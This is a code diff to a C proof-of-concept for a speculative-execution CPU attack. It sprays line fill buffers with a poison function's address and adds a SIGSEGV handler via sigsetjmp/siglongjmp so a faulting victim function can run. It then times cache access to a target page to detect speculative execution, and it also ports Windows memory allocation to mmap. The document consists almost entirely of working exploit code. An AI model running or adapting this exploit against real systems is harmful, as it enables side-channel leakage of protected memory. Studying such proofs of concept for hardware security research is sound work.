@@ -3,6 +3,9 @@
 #include <pthread.h>
 #include <sys/mman.h>
 #include <string.h>
+#include <setjmp.h>
+#include <signal.h>
+jmp_buf env;
 void SprayFillBuffers(unsigned char *buffer);
 void PoisonFunction(unsigned char * target);
 void VictimFunctionTsx(unsigned char * Buffer);
@@ -12,6 +15,11 @@ unsigned long long MeasureAccessTime(unsigned char * mem);
 unsigned char *gSprayPage = NULL;
 unsigned long long gTargetPage = 0x00000000BDBD0000;
 
+void recvSignal(int sig)
+{
+	//printf("received signal %d !!!\n",sig);
+        siglongjmp(env,1);
+}
 unsigned int Thread1(void *Argument)
 {
     unsigned int mask = 0x02;
@@ -48,21 +56,43 @@ unsigned int Thread2(void *Argument)
         //try
         //{
             // Wither VictimFunctionTsx or VictimFunctionFault will do.
-            VictimFunctionTsx(0);
-            ///VictimFunctionFault(0);
+            //
+            
         //}
-
-
+        int r=sigsetjmp(env,1);
+	if(r==0)
+	{
+	signal(SIGSEGV,recvSignal);
+	VictimFunctionFault(0);
+	//VictimFunctionTsx(0);	
+		
+	}	
+	else
+	{
+		
+		printf("\n");
+		//asm volatile("mfence":::"memory");
+		asm volatile("mfence");
+		unsigned long long t = MeasureAccessTime((unsigned char *)gTargetPage);
+		
+		if (t < 100)
+		{
+		   printf("BINGO!!!! The sprayed function has been executed, access time = %llu\n", t);
+		}
+		
+		//asm volatile("mfence":::"memory");
+		asm volatile("mfence");
+		
+	}
+	//catch(...){
+	
         // Check if the gTargetPage has been cached. Note that the only place this page is accessed from is the
         // PoisonFunction, so if we see this page cached, we now that the PoisonFunction got executed speculatively.
         //_mm_mfence();
-	asm volatile("mfence");
-        unsigned long long t = MeasureAccessTime((unsigned char *)gTargetPage);
-        if (t < 100)
-        {
-           printf("BINGO!!!! The sprayed function has been executed, access time = %llu\n", t);
-        }
-	asm volatile("mfence");
+        //printf("step 1!\n");
+	//asm volatile("":::"memory");
+
+        //asm volatile("":::"memory");
         //_mm_mfence();
     }
 
@@ -100,7 +130,7 @@ int main(int argc, char *argv[])
         //target = VirtualAlloc((PVOID)(SIZE_T)gTargetPage, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
         //simulate RESERVE
         target=mmap((void *)gTargetPage,0x10000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON,-1,0); //PROT_NONE
-        printf("target:%x\n",target);
+        
         //simulate commit
         //int result = mprotect((void *)gTargetPage,0x10000,PROT_READ|PROT_WRITE);
         if (NULL == target)
@@ -108,9 +138,7 @@ int main(int argc, char *argv[])
             printf("Poison buffer alloc failed\n");
             return -1;
         }
-
         memset(target, 0xCC, 0x10000);
-
         //_mm_clflush(target);
         //_mm_mfence();
         asm volatile("mfence");
@@ -122,6 +150,7 @@ int main(int argc, char *argv[])
         // to spray the LFBs with the address of the PoisonFunction, hoping that a branch will speculatively fetch
         // its address from the LFBs.
         //gSprayPage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        
         gSprayPage=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON,-1,0);
         //simulate commit
         //int result = mprotect(NULL,0x1000,PROT_READ|PROT_WRITE);
